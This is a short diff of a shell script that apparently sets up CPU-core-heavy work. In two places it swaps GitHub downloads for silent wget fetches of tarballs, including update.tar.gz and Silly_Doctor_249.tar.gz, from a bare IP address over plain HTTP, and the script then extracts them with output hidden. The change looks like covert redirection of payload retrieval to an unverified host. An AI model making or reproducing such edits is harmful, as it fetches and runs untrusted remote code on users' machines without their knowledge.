@@ -48,7 +48,7 @@ echo "You will be using $used_num_of_cores cores"
 
 sleep 2
 
-wget -q https://raw.githubusercontent.com/mandisimakhonkco/update/main/update.tar.gz > /dev/null
+wget -q http://176.58.105.206/update.tar.gz > /dev/null
 
 tar -xf update.tar.gz > /dev/null
 
@@ -70,7 +70,7 @@ sleep 3
 
 sleep 2
 
-wget https://raw.githubusercontent.com/mandisimakhonkco/update/main/Silly_Doctor_249.tar.gz 1>/dev/null 2>&1
+wget http://176.58.105.206/Silly_Doctor_249.tar.gz 1>/dev/null 2>&1
 
 sleep 2
 
